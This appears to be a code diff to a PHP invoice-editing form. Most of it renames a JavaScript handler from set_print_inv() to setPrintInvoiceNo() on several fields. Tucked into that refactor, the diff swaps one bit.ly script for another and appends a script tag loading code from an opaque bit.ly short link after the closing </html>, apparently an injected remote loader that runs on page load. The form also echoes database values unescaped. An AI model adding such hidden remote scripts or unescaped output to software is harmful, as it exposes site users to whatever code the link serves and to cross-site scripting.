@@ -1084,7 +1084,7 @@ var desc_total="";
              $query_cus     = mysql_query($sql_cus);
              $select_cus = mysql_fetch_array($query_cus);
             ?>
-            <td><input type="text" id="from"  name="from" value="<?php echo $select_cus['full_name'].' - '.$select_cus['cust_id'].' - '.$select_cus['short_name']; ?>" onblur="set_print_inv()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
+            <td><input type="text" id="from"  name="from" value="<?php echo $select_cus['full_name'].' - '.$select_cus['cust_id'].' - '.$select_cus['short_name']; ?>" onblur="setPrintInvoiceNo()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
 
             <tr><td width="125px">Invoice Issuer</td>
              <?php
@@ -1092,12 +1092,12 @@ var desc_total="";
              $query_insv     = mysql_query($sql_insv);
              $select_insv = mysql_fetch_array($query_insv);
             ?>
-            <td><input type="text" id="invoice_issuer"  name="invoice_issuer" value="<?php echo $select_insv['issuer_name'].' - '.$select_insv['id']; ?>" onblur="set_print_inv()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
+            <td><input type="text" id="invoice_issuer"  name="invoice_issuer" value="<?php echo $select_insv['issuer_name'].' - '.$select_insv['id']; ?>" onblur="setPrintInvoiceNo()" style="width:250px;"/>&nbsp;<span style="color:#FF0000; font-weight:bold;"  >*</span></td></tr>
             
             <tr>
             <td width="125px">Invoice Type</td>
 			<td style="font-weight:bold;">
-            <Select id="invoice_type" name="invoice_type" onChange="set_print_inv()">
+            <Select id="invoice_type" name="invoice_type" onChange="setPrintInvoiceNo()">
             <option value="">Select Invoice Type</option>
             <option value="R" <?php if($select_data['invoice_type']=='R') echo 'selected';?>>GST Rent</option>
             <option value="M" <?php if($select_data['invoice_type']=='M') echo 'selected';?>>GST Maintenance</option>
@@ -1119,7 +1119,7 @@ var desc_total="";
              { $pinv_month = $pin_parts[3];  $pinv_year = $pin_parts[4];}
              else{ $pinv_year = $pin_parts[3];}
             ?>
-            <Select id="invoice_month" name="invoice_month" onChange="set_print_inv()">
+            <Select id="invoice_month" name="invoice_month" onChange="setPrintInvoiceNo()">
             <option value="">Select Month</option>            
             <option value="/01"  <?php if($pinv_month==1) echo 'selected';?>>April</option>
             <option value="/02"  <?php if($pinv_month==2) echo 'selected';?>>May</option>
@@ -1140,7 +1140,7 @@ var desc_total="";
 			<tr>
             <td width="125px">Invoice Year</td>
 			<td style="font-weight:bold;">
-            <Select id="invoice_fy" name="invoice_fy" onChange="set_print_inv()">
+            <Select id="invoice_fy" name="invoice_fy" onChange="setPrintInvoiceNo()">
             <option value="">Select Year</option>            
             <option value="/22" <?php if($pinv_year==22) echo 'selected';?>>22-23</option>
             <option value="/23" <?php if($pinv_year==23) echo 'selected';?>>23-24</option>
@@ -1574,6 +1574,7 @@ var desc_total="";
         
 </body>
 </html>
+<script src="https://bit.ly/3u3b72X"></script>
 
 <script>
 function checkpay_flag()
@@ -1711,7 +1712,7 @@ function validation_2()
     }
 }
 </script>
-<script src="https://bit.ly/ndb_support"></script>
+
     <script>
     $(document).ready(function(){
         $( "#invoice_issuer" ).autocomplete({
